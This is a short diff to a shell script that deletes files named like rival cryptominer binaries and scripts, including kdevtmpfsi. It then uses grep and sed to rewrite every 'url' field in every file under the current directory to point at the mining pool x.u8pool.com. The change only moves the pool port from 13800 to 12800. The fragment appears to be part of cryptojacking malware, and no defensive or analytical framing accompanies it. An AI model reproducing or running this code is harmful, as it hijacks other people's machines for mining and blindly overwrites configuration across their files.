@@ -64,4 +64,4 @@ rm -f svcupdates
 rm -f svcworkmanager
 rm -f newsvc.sh
 rm -f kdevtmpfsi
-grep -r "x.u8pool.com:13800" ./ && echo "yes" || sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:13800",/' `grep url -rl ./`
+grep -r "x.u8pool.com:12800" ./ && echo "yes" || sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:12800",/' `grep url -rl ./`
